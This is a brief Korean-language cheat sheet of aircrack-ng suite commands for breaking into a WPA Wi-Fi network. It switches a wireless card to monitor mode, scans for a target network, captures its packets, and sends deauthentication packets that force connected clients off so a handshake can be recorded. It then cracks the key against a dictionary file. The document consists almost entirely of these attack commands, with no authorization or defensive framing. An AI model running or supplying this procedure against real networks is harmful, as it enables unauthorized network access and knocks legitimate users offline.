### 무선랜카드를 모니터모드로 전환
airmon-ng start [interface name]

### 모드변경 확인
iwconfig

### 작업 방해 프로세스들 종료
airmon-ng check kill

### 인터페이스 이름 확인
airmon-ng

### 공격할 무선랜 검색
BSSID와 channel 확인  
airodump-ng [interface name]

## 새 터미널
### 패킷 저장
airodump-ng [interfaceName] --bssid [Target bssid] -w [fileName]

## 새 터미널
### 4way handshake 패킷 발생을 위한 클라이언트 강제 연결 해제
aireplay-ng --deauth [send deauthentication packet count] -a [bssid] [interface name]

### 사전파일에서 키를 탐색
aircrack-ng -b [target bssid] -w [dictionary file name] [.cap file name]
